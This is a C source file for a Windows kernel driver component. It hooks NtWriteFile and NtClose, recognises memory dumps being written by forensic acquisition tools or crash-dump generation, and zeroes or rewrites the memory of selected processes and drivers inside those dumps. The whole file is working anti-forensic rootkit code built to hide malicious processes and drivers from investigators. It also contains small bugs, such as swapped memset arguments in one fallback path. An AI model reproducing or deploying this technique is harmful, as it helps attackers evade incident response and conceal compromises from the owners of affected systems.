#include "HideEngine.h"
#include "HideEnginePrivateIncludes.h"
#include "HookEngine.h"
#include "ForensicAppDumpDetector.h"
#include "CrashDumpDetector.h"
#include "SymbolEngine.h"
#include "SortedList.h"
#include "HideEntry.h"
#include "ProcessHider.h"
#include "DriverHider.h"

// boolean representing status of HookEngine
static BOOLEAN bIsHidEngineInitialized = FALSE;

// flag which represents the state of internal symbols and lists (dump handles list, etc).
static BOOLEAN bSymbolsAndListsInitialized = FALSE;

// pointer to original NtWriteFile function
static PVOID pNtWriteFileOriginal = NULL;

// executable call buffer
static PUCHAR pNtWriteFileHook = NULL;

// pointer to original NtClose function
static PVOID pNtCloseOriginal = NULL;

// pointer to the event that will be signaled when acquisition application finishes writing the dump
// this event might not be used, if the user mode application decided not to create it and pass it to kernel mode - always check for validity!
static PKEVENT pHidingFinishedEvent = NULL;

// there is a possibility for multiple forensic applications (i.e. memory acquisition tools) to be started at the same time
// in order to handle such situation, all handles that represent memory dump files will be stored in a singly-linked list for
// faster retreival
static NPAGED_LOOKASIDE_LIST DumpHandlesLookasideList;

// the head of the handle list
static LIST_ENTRY DumpHandlesListHead;

// mutex which will protect accesses to handles list
static FAST_MUTEX DumpHandlesListMutex;

// list which will contain all addresses/blocks that need to be hidden
static SORTED_LIST HideList;

// array containing all target object types
static TARGET_OBJECT_TYPE *pTargetTypes = NULL;

// size of the previous array
static ULONG uTargetTypesArraySize = 0;

// executable call buffer for NtClose
static PUCHAR pNtCloseHook = NULL;

// old and new NtWriteFile function -- our hook
NTSTATUS NTAPI OldNtWriteFile(NT_WRITEFILE_ARGUMENTS);
NTSTATUS NTAPI NewNtWriteFile(NT_WRITEFILE_ARGUMENTS);

DEFINE_HOOK_CALL(NTSTATUS NTAPI OldNtWriteFile,
				 NT_WRITEFILE_ARGUMENTS,
				 pNtWriteFileHook
				 );

// old and new NtClose functions
NTSTATUS NTAPI OldNtClose(NT_CLOSE_ARGUMENTS);
NTSTATUS NTAPI NewNtClose(NT_CLOSE_ARGUMENTS);

DEFINE_HOOK_CALL(NTSTATUS NTAPI OldNtClose,
				 NT_CLOSE_ARGUMENTS,
				 pNtCloseHook
				 );

BOOLEAN HidpAddTargetObjects(const IN PTARGET_OBJECT, const ULONG);
BOOLEAN HidpAddHandle(const IN HANDLE, const IN BOOLEAN);
ULONG HidpGetDumpFileHandleCount(void);
BOOLEAN HidpIsDumpFileHandle(const IN HANDLE, OUT PULONG_PTR, OUT PBOOLEAN);
BOOLEAN HidpSetDumpFileOffset(const IN HANDLE, const IN ULONG_PTR);
BOOLEAN HidpFindAndRemoveFileHandle(IN HANDLE);
PDUMPFILE_ENTRY HidpGetDumpFileEntry(const IN HANDLE);
BOOLEAN HidpPopulateHideList(IN OUT PSORTED_LIST);
BOOLEAN HidpHideObjects(const IN HANDLE, IN OUT PVOID, const IN ULONG, const IN ULONG_PTR, const IN BOOLEAN);
VOID HidpReplaceMemory(IN OUT PVOID, const IN PVOID, const IN ULONG);
VOID HidpClearMemory(IN OUT PVOID, const IN ULONG);
VOID HidpHideListEntryCleanup(IN PSORTED_LIST_ENTRY);

NTSTATUS HidInit(VOID)
{
	KeEnterCriticalRegion();
	// initialize hooking engine if not already initialized
	if(!HkIsInitialized())
	{
		HkInit();
	}

	// initialize symbol engine if it isn't already initialized
	if(!SymIsInitialized())
	{
		SymInit();
	}
	
	if(bIsHidEngineInitialized == TRUE)
	{
		KeLeaveCriticalRegion();
		return STATUS_SUCCESS;
	}

	// maybe return value should be checked
	FddInit();

	if(!NT_SUCCESS(CddInit()))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the crash dump detector failed -- if a crash dump is generated it will not be valid!\n"));
	}

	if(!NT_SUCCESS(PhInit()))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the process hider failed -- processes won't be hidden!\n"));
	}

	if(!NT_SUCCESS(DhInit()))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the driver hider failed -- drivers won't be hidden!\n"));
	}

	// creating sorted list which will contain all addresses/block that need to be hidden
	if(!NT_SUCCESS(SortedListCreate(&HideList, sizeof(HIDE_ADDRESS_ENTRY), NonPagedPool, TAG_HIDE_LIST, TRUE, HidpHideListEntryCleanup)))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the hide list failed! Cannot enumerate addresses for hiding...\n"));
		DhUnInit();
		PhUnInit();
		CddUnInit();
		FddUnInit();
		KeLeaveCriticalRegion();
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	// add wanted symbols
	if(!SymAddSymbol("NtWriteFile", -1, -1, -1, -1) ||
		!SymAddSymbol("NtClose", -1, -1, -1, -1))
	{
		KdPrint(("[DEBUG] ERROR - Failure while adding HideEngine symbols...\n"));
		DhUnInit();
		PhUnInit();
		CddUnInit();
		FddUnInit();
		// delete all elements of the hide list
		SortedListDestroy(&HideList);
		KeLeaveCriticalRegion();
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	bIsHidEngineInitialized = TRUE;
	KeLeaveCriticalRegion();

	return STATUS_SUCCESS;
}

BOOLEAN HidIsInitialized(VOID)
{
	return bIsHidEngineInitialized;
}

NTSTATUS HidStartHiding(IN PTARGET_OBJECT pTargetObjectArray, IN ULONG uArraySize, IN PKEVENT pFinishedEvent)
{
	ASSERTMSG("Cannot start hiding because HideEngine has not yet been initialized", bIsHidEngineInitialized == TRUE);

	if(pTargetObjectArray == NULL || uArraySize == 0 || uArraySize < sizeof(TARGET_OBJECT))
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the hook engine failed because invalid hide object array or size was specified!\n"));
		return STATUS_INVALID_BUFFER_SIZE;
	}

	// store the event
	pHidingFinishedEvent = pFinishedEvent;

	// TODO: check return value?
	FddInitSymbols();
	PhInitSymbols();
	DhInitSymbols();

	ULONG uNumOfObjs = uArraySize / sizeof(TARGET_OBJECT);

	// allocate memory for the array of target types (used later when addresses which must be hidden are being determined)
	pTargetTypes = (TARGET_OBJECT_TYPE *) ExAllocatePoolWithTag(PagedPool, uNumOfObjs * sizeof(TARGET_OBJECT_TYPE), TAG_TARGET_OBJECTS_ARRAY);
	if(pTargetTypes == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the target type array failed!\n"));
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	RtlZeroMemory(pTargetTypes, uNumOfObjs * sizeof(TARGET_OBJECT_TYPE));

	if(!HidpAddTargetObjects(pTargetObjectArray, uNumOfObjs))
	{
		KdPrint(("[DEBUG] WARNING - Some of the target objects were not sucessfully added - hide engine will not hide these objects...\n"));
	}

	// hook NtWriteFile
	pNtWriteFileOriginal = (PVOID) SymGetExportedAddress("NtWriteFile");
	pNtCloseOriginal = (PVOID) SymGetExportedAddress("NtClose");
	if(pNtWriteFileOriginal == NULL || pNtCloseOriginal == NULL)
	{
		KdPrint(("[DEBUG] ERROR - Initialization of the hook engine failed because some of the symbols were not found\n"));
		ExFreePoolWithTag(pTargetTypes, TAG_TARGET_OBJECTS_ARRAY);
		return STATUS_NOT_FOUND;
	}

	ASSERTMSG("Fast mutex must be initialized at or below DISPATCH_LEVEL", KeGetCurrentIrql() <= DISPATCH_LEVEL);

	// initialize all required data structures
	ExInitializeNPagedLookasideList(&DumpHandlesLookasideList,			// list to initialize
									NULL,								// allocate function - OS supplied
									NULL,								// free function - OS supplied
									0,									// flags - always zero
									sizeof(DUMPFILE_ENTRY),				// size of each entry to be allocated
									TAG_DUMP_HANDLES_LOOKASIDE,			// HanL(ookaside) tag
									0									// depth - always zero
									);
	InitializeListHead(&DumpHandlesListHead);
	ExInitializeFastMutex(&DumpHandlesListMutex);

	// hooks must be created after the list, because the hooks are using the list
	if(!NT_SUCCESS(HkHook(pNtWriteFileOriginal, NewNtWriteFile, &pNtWriteFileHook)))
	{
		KdPrint(("[DEBUG] ERROR - Error while hooking NtWriteFile!\n"));
		ExFreePoolWithTag(pTargetTypes, TAG_TARGET_OBJECTS_ARRAY);
		return STATUS_INVALID_ADDRESS;
	}

	if(!NT_SUCCESS(HkHook(pNtCloseOriginal, NewNtClose, &pNtCloseHook)))
	{
		KdPrint(("[DEBUG] ERROR - Error while hooking NtClose!\n"));
		KeLeaveCriticalRegion();
		return STATUS_INVALID_ADDRESS;
	}

	bSymbolsAndListsInitialized = TRUE;

	return STATUS_SUCCESS;
}

VOID HidUnInit(VOID)
{
	ASSERTMSG("Critical region and lookaside list deletion must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);

	KeEnterCriticalRegion();
	// check if engine has been initialized
	if(bIsHidEngineInitialized == FALSE)
	{
		KeLeaveCriticalRegion();
		return;
	}

	FddUnInit();
	CddUnInit();
	PhUnInit();
	DhUnInit();

	// delete all elements of the hide list
	SortedListDestroy(&HideList);

	// some additional memory was allocated for symbols and dump handles list
	if(bSymbolsAndListsInitialized == TRUE)
	{
		// delete array of target types
		ExFreePoolWithTag(pTargetTypes, TAG_TARGET_OBJECTS_ARRAY);

		// free all entries in lookaside list
		ExDeleteNPagedLookasideList(&DumpHandlesLookasideList);

		// delete all allocated executable buffers, because methods have already been unhooked at this point, AT LEAST THEY SHOULD BE!
		ExFreePoolWithTag(pNtWriteFileHook, TAG_EXEC_BUFFER);
	}

	bIsHidEngineInitialized = FALSE;
	bSymbolsAndListsInitialized = FALSE;
	KeLeaveCriticalRegion();
}

NTSTATUS NTAPI NewNtWriteFile(NT_WRITEFILE_ARGUMENTS)
{
	// do some fast checks first -- all tested memory acquisition tools have event, APC and Key parameters equal to NULL
	if(Event == NULL && ApcRoutine == NULL && ApcContext == NULL && Key == NULL)
	{
		// ignore all writes from the System or Idle (!?) processes
		ULONG dwPID = (ULONG) PsGetCurrentProcessId();
		if(dwPID != 0 && dwPID != 4)
		{
			ULONG_PTR uFileOffset = 0;
			BOOLEAN bIsCrashDump = FALSE;
			// first check if the handle is already in the list of known handles
			if(HidpIsDumpFileHandle(FileHandle, &uFileOffset, &bIsCrashDump))
			{
				HidpHideObjects(FileHandle, Buffer, Length, uFileOffset, bIsCrashDump);
				HidpSetDumpFileOffset(FileHandle, uFileOffset + Length);
			}
			else if(FddIsForensicAppDumpFile(FileHandle, IoStatusBlock, Buffer, Length, ByteOffset))
			{
				KdPrint(("[DEBUG] Found dump file -- adding to list of known handles...\n"));
				
				// check if this file is a crash dump and add store this info together with the file handle
				BOOLEAN bIsCrashDump = CddIsCrashDumpFile(FileHandle, Buffer, Length);

				HidpAddHandle(FileHandle, bIsCrashDump);
				HidpPopulateHideList(&HideList);

				// hide objects and update offset -- current offset is 0!
				HidpHideObjects(FileHandle, Buffer, Length, 0, bIsCrashDump);
				HidpSetDumpFileOffset(FileHandle, Length);
			}
		}
	}

	return OldNtWriteFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);
}

NTSTATUS NTAPI NewNtClose(NT_CLOSE_ARGUMENTS)
{
	BOOLEAN bShouldSignal = FALSE;

	// it is possible that handle being removed from our lookaside list still has references and is still used in some other program
	// this is not a problem though, because the detection algorithm will detect it again (inside NtWriteFile hook) when encountered
	// also, check for NULL handle - it appears Win7 is passing NULL handles to NtClose sometimes (UAC related?)
	if(Handle != NULL && HidpFindAndRemoveFileHandle(Handle))
	{
		KdPrint(("[DEBUG] Removed Handle 0x%x from the dump lookaside list\n", Handle));
	
		// if there are no other handles in the list, signal the event to unload the driver
		if(HidpGetDumpFileHandleCount() == 0)
		{
			bShouldSignal = TRUE;
		}
	}

	// allow the application to close the handle
	NTSTATUS status = OldNtClose(Handle);

	// signal the event if it is valid and if it should be signaled
	if(pHidingFinishedEvent != NULL && bShouldSignal == TRUE)
	{
		ASSERTMSG("Event signaling must occur at or below DISPATCH_LEVEL", KeGetCurrentIrql() <= DISPATCH_LEVEL);
		KdPrint(("[DEBUG] Signaling the event - driver will soon unload...\n"));
		KeSetEvent(	pHidingFinishedEvent,		// event being signaled
					(KPRIORITY) 0,				// no priority - not used because waiting is not used
					FALSE						// don't wait for the event
					);
	}

	return status;
}

BOOLEAN HidpAddTargetObjects(const IN PTARGET_OBJECT pTargetObjectArray, const ULONG uNumOfObjects)
{
	ASSERTMSG("Pointer to array of target object must not be NULL", pTargetObjectArray != NULL);

	BOOLEAN bRet = TRUE;
	for(ULONG objIndex = 0; objIndex < uNumOfObjects; objIndex++)
	{
		PTARGET_OBJECT pTargetObject = &pTargetObjectArray[objIndex];
		
		BOOLEAN bAddFunctionRet = TRUE;
		switch(pTargetObject->type)
		{
		case PROCESS:			
			bAddFunctionRet = PhAddTargetProcess(pTargetObject);
			break;
		case DRIVER:
			{
				bAddFunctionRet = DhAddTargetDriver(pTargetObject->szObjectName);
				break;
			}
		}

		if(bAddFunctionRet)
		{
			// check if target type already exists
			BOOLEAN bExists = FALSE;
			for(ULONG uTypeIndex = 0; uTypeIndex < uTargetTypesArraySize; uTypeIndex++)
			{
				if(pTargetTypes[uTypeIndex] == pTargetObject->type)
				{
					bExists = TRUE;
					break;
				}
			}

			// if type does not exist, add it to the array
			if(!bExists)
			{
				// the size of array will ALWAYS be <= uNumOfObjects, so no worry about the overflow
				pTargetTypes[uTargetTypesArraySize] = pTargetObject->type;
				uTargetTypesArraySize++;
			}
			
		}

		// if any of the functions that add the target process fails, return value is also a failure
		bRet &= bAddFunctionRet;
	}

	return bRet;
}

BOOLEAN HidpAddHandle(const IN HANDLE hFileHandle, const IN BOOLEAN bIsCrashDump)
{
	ASSERTMSG("Passed file handle is NULL", hFileHandle != NULL);

	PDUMPFILE_ENTRY pDumpFileEntry = (PDUMPFILE_ENTRY) ExAllocateFromNPagedLookasideList(&DumpHandlesLookasideList);
	if(pDumpFileEntry == NULL)
	{
		KdPrint(("[DEBUG] WARNING - Not enough memory in lookaside list to allocate new dump file entry...\n"));
		return FALSE;
	}

	// add new handle to list (thread-safely)
	pDumpFileEntry->hDumpFile = hFileHandle;
	pDumpFileEntry->uOffset = 0;
	pDumpFileEntry->bIsCrashDump = bIsCrashDump;

	ASSERTMSG("Fast mutex acquire/release must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpHandlesListMutex);
	InsertHeadList(&DumpHandlesListHead, &pDumpFileEntry->ListEntry);
	ExReleaseFastMutex(&DumpHandlesListMutex);

	return TRUE;	
}

ULONG HidpGetDumpFileHandleCount(void)
{
	PLIST_ENTRY dumpFileListEntry = DumpHandlesListHead.Flink;
	ULONG uCount = 0;

	// iterate through the dump file list
	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpHandlesListMutex);
	while(dumpFileListEntry != &DumpHandlesListHead)
	{
		uCount++;
		dumpFileListEntry = dumpFileListEntry->Flink;
	}

	// release the mutex and return the length of the list (i.e. number of handles to dump files)
	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpHandlesListMutex);
	return uCount;
}

BOOLEAN HidpIsDumpFileHandle(const IN HANDLE hFileHandle, OUT PULONG_PTR puOffset, OUT PBOOLEAN pbIsCrashDump)
{
	ASSERTMSG("Passed file handle is NULL", hFileHandle != NULL);
	ASSERTMSG("Passed pointer to file offset is NULL", puOffset != NULL);
	ASSERTMSG("Passed pointer to crash dump specifier is NULL", pbIsCrashDump != NULL);

	*puOffset = 0;
	PDUMPFILE_ENTRY pDumpFileEntry = HidpGetDumpFileEntry(hFileHandle);

	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpHandlesListMutex);
	if(pDumpFileEntry != NULL)
	{
		*puOffset = pDumpFileEntry->uOffset;
		*pbIsCrashDump = pDumpFileEntry->bIsCrashDump;
		ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
		ExReleaseFastMutex(&DumpHandlesListMutex);
		return TRUE;
	}
	
	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpHandlesListMutex);
	return FALSE;
}

BOOLEAN HidpSetDumpFileOffset(const IN HANDLE hFileHandle, const IN ULONG_PTR uOffset)
{
	ASSERTMSG("Passed file handle is NULL", hFileHandle != NULL);

	PDUMPFILE_ENTRY pDumpFileEntry = HidpGetDumpFileEntry(hFileHandle);

	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpHandlesListMutex);
	if(pDumpFileEntry != NULL)
	{
		pDumpFileEntry->uOffset = uOffset;
		ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
		ExReleaseFastMutex(&DumpHandlesListMutex);
		return TRUE;
	}

	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpHandlesListMutex);
	return FALSE;
}

BOOLEAN HidpFindAndRemoveFileHandle(IN HANDLE hFileHandle)
{
	ASSERTMSG("Passed file handle is NULL", hFileHandle != NULL);

	PDUMPFILE_ENTRY pDumpFileEntry = HidpGetDumpFileEntry(hFileHandle);

	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpHandlesListMutex);
	if(pDumpFileEntry != NULL)
	{
		// remove the entry and free allocated memory
		RemoveEntryList(&pDumpFileEntry->ListEntry);
		ExFreeToNPagedLookasideList(&DumpHandlesLookasideList, pDumpFileEntry);
		ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
		ExReleaseFastMutex(&DumpHandlesListMutex);
		return TRUE;
	}

	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpHandlesListMutex);
	return FALSE;
}

PDUMPFILE_ENTRY HidpGetDumpFileEntry(const IN HANDLE hFileHandle)
{
	ASSERTMSG("Passed file handle is NULL", hFileHandle != NULL);

	PLIST_ENTRY dumpFileListEntry = DumpHandlesListHead.Flink;

	// iterate through the dump file list
	ASSERTMSG("Fast mutex acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	ExAcquireFastMutex(&DumpHandlesListMutex);
	while(dumpFileListEntry != &DumpHandlesListHead)
	{
		PDUMPFILE_ENTRY pDumpFileEntry = CONTAINING_RECORD(dumpFileListEntry, DUMPFILE_ENTRY, ListEntry);
		// if this is the wanted entry
		if(pDumpFileEntry->hDumpFile == hFileHandle)
		{
			// return it to the caller
			ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
			ExReleaseFastMutex(&DumpHandlesListMutex);
			return pDumpFileEntry;
		}

		dumpFileListEntry = dumpFileListEntry->Flink;
	}

	// wanted dump file entry is not present in the list, return NULL
	ASSERTMSG("Fast mutex release must occur at APC_LEVEL", KeGetCurrentIrql() == APC_LEVEL);
	ExReleaseFastMutex(&DumpHandlesListMutex);
	return NULL;
}

BOOLEAN HidpPopulateHideList(IN OUT PSORTED_LIST pSortedList)
{
	ASSERTMSG("Pointer to sorted list of addresses cannot be NULL", pSortedList != NULL);

	BOOLEAN bRet = TRUE;

	for(ULONG objIndex = 0; objIndex < uTargetTypesArraySize; objIndex++)
	{
		switch(pTargetTypes[objIndex])
		{
		case PROCESS:
			bRet &= PhFindHideAddreses(pSortedList);
			break;
		case DRIVER:
			bRet &= DhFindHideAddreses(pSortedList);
			break;
		}
	}

	return bRet;
}

BOOLEAN HidpHideObjects(const IN HANDLE hFile, IN OUT PVOID pBuffer, IN const ULONG uBufLength, const IN ULONG_PTR uOffset, const IN BOOLEAN bIsCrashDump)
{
	ASSERTMSG("Passed pointer to buffer which contains memory dump is NULL", pBuffer != NULL);

	PHIDE_ADDRESS_ENTRY pEntry = NULL;
	BOOLEAN bRet = FALSE;

	// use write lock for synchronizing access, since elements will be deleted if they're found
	ASSERTMSG("Sorted list lock acquire must occur at or below APC_LEVEL", KeGetCurrentIrql() <= APC_LEVEL);
	SortedListWriteLock(&HideList);

	// go through the list of objects that need to be hidden - the list is SORTED by physical address
	// search will exit as soon as no object has been found so-far based on the sorted physical address
	while((pEntry = (PHIDE_ADDRESS_ENTRY) SortedListGetNext(&HideList, (PSORTED_LIST_ENTRY) pEntry)) != NULL)
	{
		ULONG_PTR uAddress = (ULONG_PTR) pEntry->pPhysicalAddress;

		// fix address if the crash dump is being generated
		if(bIsCrashDump)
		{
			uAddress = (ULONG_PTR) CddGetFixedAddress(hFile, (PVOID) uAddress);
		}

		// check if address in the current list element is bigger OR EQUAL (!) than the current offset
		// if this is the case, then exit because all other list elements have addresses bigger than the offset
		if(uAddress >= uOffset + uBufLength)
		{
			break;
		}

		// check if current buffer contains the "object" specified by the list entry
		if((uAddress >= uOffset) && (uAddress < (uOffset + uBufLength)))
		{
			bRet = TRUE;

			// get relative address inside the buffer (this address is the offset inside the buffer from the current "offset"
			// in the complete memory dump file)
			ULONG_PTR uBufRelativeAddress = uAddress - uOffset;

			// perform cleaning operation depending on the type
			switch(pEntry->type)
			{
			case REPLACE:
				// using brackets for variable declaration/definition
				{
					
					// check if overwriting the right value -- if not, just print the warning for now
					PVOID pOldMemContents = (PVOID)((ULONG_PTR) pBuffer + uBufRelativeAddress);
					if(RtlCompareMemory(pOldMemContents, pEntry->pOldMemContents, pEntry->uSize) == pEntry->uSize)
					{
						KdPrint(("[DEBUG] Object for hiding found - replacing %d bytes at 0x%p with new value\n", pEntry->uSize, uOffset));
					}
					else
					{
						KdPrint(("[DEBUG] WARNING - value in memory different from the value in the hide list! Replacing anyway...\n"));
					}
					HidpReplaceMemory((PVOID)((ULONG_PTR) pBuffer + uBufRelativeAddress), pEntry->pNewMemContents, pEntry->uSize);
				}
				break;
			case DEL:
				// using brackets for variable declaration/definition
				{
					// make sure that data INSIDE the buffer is being deleted
					//
					// TODO:
					// there could be THEORETICAL possibility that data which will be deleted is present in multiple adjacent buffers
					// since only allocations are being deleted at the moment, this is not a concern (allocations that we will be hiding 
					// will always be within one page only), but a generic handling of this situation would definitely be nice
					ULONG uSize = pEntry->uSize;
					if(uBufRelativeAddress + uSize > uBufLength)
					{
						KdPrint(("[DEBUG] WARNING - size of block to be deleted (0x%x) is beyond the current buffer. Deleting all possible data in this buffer\n", uSize));
						uSize = uBufLength - uBufRelativeAddress;
					}

					KdPrint(("[DEBUG] Object for hiding found - deleting 0x%x bytes starting from offset 0x%p (virt. addr. 0x%p)\n", uSize, uAddress, pEntry->pVirtualAddress));
					HidpClearMemory((PVOID)((ULONG) pBuffer + uBufRelativeAddress), uSize);
				}
				break;
			default:
				KdPrint(("[DEBUG] WARNING - Invalid hide type specified: %d\n", pEntry->type));
			}

			// remove this entry from the list and continue looping
			/*PSORTED_LIST_ENTRY pNextEntry = SortedListGetNext(&HideList, (PSORTED_LIST_ENTRY) pEntry);
			SortedListRemoveEntry(&HideList, (PSORTED_LIST_ENTRY) pEntry);
			pEntry = pNextEntry;*/
		}
	}

	ASSERTMSG("Sorted list lock release must occur at or below DISPATCH_LEVEL", KeGetCurrentIrql() <= DISPATCH_LEVEL);
	SortedListWriteUnlock(&HideList);
	return bRet;
}

VOID HidpReplaceMemory(IN OUT PVOID pBuffer, const IN PVOID pNewMemContents, const IN ULONG uSize)
{
	ASSERTMSG("Passed pointer to buffer which contains memory dump is NULL", pBuffer != NULL);
	ASSERTMSG("Passed pointer to buffer which contains new memory contents is NULL", pNewMemContents != NULL);

	if(MmIsAddressValid(pBuffer))
	{
		__try
		{
			// some forensic tools guard their buffers by setting them write-only
			// check if the buffer is writable
			if(pBuffer <= MmHighestUserAddress)
			{
				ProbeForWrite(pBuffer, uSize, 4);
			}
			RtlCopyMemory(pBuffer, pNewMemContents, uSize);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			// write is not possible - map the MDL and try to do it that way
			PMDL pMDL = NULL;
			PVOID pMappedAddress = NULL;
			NTSTATUS status = STATUS_SUCCESS;

			status = HkMapMDL(	pBuffer,			// create MDL over our buffer
								sizeof(ULONG),		// size of the buffer
								UserMode,			// access mode
								&pMDL,				// pointer to created MDL
								&pMappedAddress		// pointer to mapped MDL address
								);

			if(!NT_SUCCESS(status))
			{
				KdPrint(("[DEBUG] WARNING - Could not create MDL over the write buffer @ 0x%p, size: 0x%d\n", pBuffer, sizeof(ULONG)));
				return;
			}

			// zero-out the buffer using the mapped address
			RtlCopyMemory(pMappedAddress, pNewMemContents, uSize);

			// unmap the pages and free the MDL
			MmUnmapLockedPages(pMappedAddress, pMDL);
			IoFreeMdl(pMDL);
		}
	}
}

VOID HidpClearMemory(IN OUT PVOID pBuffer, const IN ULONG uSize)
{
	ASSERTMSG("Passed pointer to buffer which contains memory dump is NULL", pBuffer != NULL);

	// zero-out specified portion of the buffer and effectively remove the object
	// TODO: implement other ways of hiding?
	if(MmIsAddressValid(pBuffer))
	{
		__try
		{
			// some forensic tools guard their buffers by setting them write-only
			// check if the buffer is writable (of course, only if the buffer is in user-mode)
			if(pBuffer <= MmHighestUserAddress)
			{
				ProbeForWrite(pBuffer, uSize, 4);
			}
			memset(pBuffer, 0, uSize);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			// write is not possible - map the MDL and try to do it that way
			PMDL pMDL = NULL;
			PVOID pMappedAddress = NULL;
			NTSTATUS status = STATUS_SUCCESS;

			status = HkMapMDL(	pBuffer,			// create MDL over our buffer
								uSize,				// size of the buffer
								UserMode,			// access mode
								&pMDL,				// pointer to created MDL
								&pMappedAddress		// pointer to mapped MDL address
							  );

			if(!NT_SUCCESS(status))
			{
				KdPrint(("[DEBUG] WARNING - Could not create MDL over the write buffer @ 0x%p, size: 0x%d\n", pBuffer, uSize));
				return;
			}

			// zero-out the buffer using the mapped address
			memset(pMappedAddress, uSize, 0);

			// unmap the pages and free the MDL
			MmUnmapLockedPages(pMappedAddress, pMDL);
			IoFreeMdl(pMDL);
		}
	}
}

VOID HidpHideListEntryCleanup(IN PSORTED_LIST_ENTRY pEntry)
{
	ASSERTMSG("Entry must not be NULL", pEntry != NULL);

	// check if old/new memory contents exist
	PHIDE_ADDRESS_ENTRY pHideEntry = (PHIDE_ADDRESS_ENTRY) pEntry;

	if(pHideEntry->pOldMemContents != NULL)
	{
		ExFreePoolWithTag(pHideEntry->pOldMemContents, TAG_HIDE_ARRAY);
	}

	if(pHideEntry->pNewMemContents != NULL)
	{
		ExFreePoolWithTag(pHideEntry->pNewMemContents, TAG_HIDE_ARRAY);
	}

	ExFreePoolWithTag(pEntry, TAG_HIDE_ADDRESS_ENTRY);
}